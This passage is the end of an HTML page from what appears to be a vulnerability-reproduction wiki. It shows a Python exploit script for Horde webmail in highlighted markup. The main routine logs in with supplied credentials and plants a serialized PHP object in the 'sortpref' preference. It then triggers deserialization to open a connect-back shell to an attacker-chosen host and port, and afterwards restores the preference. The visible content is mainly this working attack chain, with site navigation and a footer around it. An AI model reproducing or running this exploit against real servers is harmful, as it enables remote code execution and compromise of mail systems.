        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) usage </span><span class="si">%s</span><span class="s2"> &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) eg: </span><span class="si">%s</span><span class="s2"> 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">path</span>   <span class="o">=</span> <span class="n">fix_path</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">user</span>   <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">pswd</span>   <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">host</span>   <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">port</span>   <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) targeting http://</span><span class="si">%s%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">path</span><span class="p">))</span>
    <span class="n">session</span> <span class="o">=</span> <span class="n">get_session</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">pswd</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) obtained session </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">session</span><span class="p">)</span>
    <span class="n">set_pref</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="s1">&#39;sortpref&#39;</span><span class="p">,</span> <span class="n">get_pop</span><span class="p">())</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) inserted our php object&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) triggering deserialization...&quot;</span><span class="p">)</span>
    <span class="n">trigger_deserialization</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="n">set_pref</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="s1">&#39;sortpref&#39;</span><span class="p">,</span> <span class="n">get_patch</span><span class="p">())</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) repaired the target!&quot;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Hoverfly/Hoverfly%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3simulation%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%28CVE-2024-45388%29/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Hoverfly/Hoverfly%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3simulation%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%28CVE-2024-45388%29/" class="btn btn-xs btn-link">
        Hoverfly系统接口simulation任意文件读取漏洞复现(CVE-2024-45388)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Hfs/Hfs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Hfs/Hfs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Hfs 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>